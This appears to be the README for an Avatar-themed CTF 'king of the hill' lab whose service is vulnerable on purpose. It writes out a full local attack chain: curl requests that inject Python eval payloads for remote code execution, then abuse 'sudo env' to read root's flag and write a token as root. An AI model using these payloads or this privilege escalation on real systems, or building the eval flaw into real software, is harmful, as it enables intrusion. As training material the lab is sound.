# Hill 16 - Unobtainium Refinery (Avatar) (repair -> eval RCE -> sudo env)

*Theme: Avatar / RDA.* A "repair-first" hill: the refinery boots **offline** (coolant mount
down) and the calibration endpoint refuses to run until you repair it.

- **Repair gate:** `GET /repair?mount=core-7&coolant=on` restores the coolant mount and
  brings the refinery online. Only then does the calibration endpoint work.
- **Entry:** `GET /calibrate?formula=...` evaluates the formula server-side with `eval` ->
  RCE. Foothold: `refiner`. Port 80 (8096 locally).
- **Privesc:** sudoers lets `refiner` run `env` as root (GTFOBins):
  `sudo env cat /root/root.txt`, `sudo env /bin/sh -c '...'`. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. repair the coolant mount (bring the refinery online)
    curl -s 'http://127.0.0.1:8096/repair?mount=core-7&coolant=on'

    # 2. eval RCE -> user flag
    curl -s -G http://127.0.0.1:8096/calibrate --data-urlencode \
      "formula=__import__('subprocess').run(['cat','/home/refiner/user.txt'],capture_output=True,text=True).stdout"

    # 3. privesc via sudo env -> root flag
    curl -s -G http://127.0.0.1:8096/calibrate --data-urlencode \
      "formula=__import__('subprocess').run(['sudo','env','cat','/root/root.txt'],capture_output=True,text=True).stdout"

    # 4. take the hill: write your token to /root/king.txt as root
    curl -s -G http://127.0.0.1:8096/calibrate --data-urlencode \
      "formula=__import__('subprocess').run(['sudo','env','/bin/sh','-c','echo TOK-YOUR-TEAM > /root/king.txt'],capture_output=True,text=True).stdout"

## Run locally

    docker compose up -d --build   # app: http://localhost:8096/

## Reset behaviour

`reset.sh` restores the `sudo env` privesc **and re-breaks the refinery** (back offline), so
the repair puzzle is fresh for the next attacker. It does **not** touch `king.txt`.
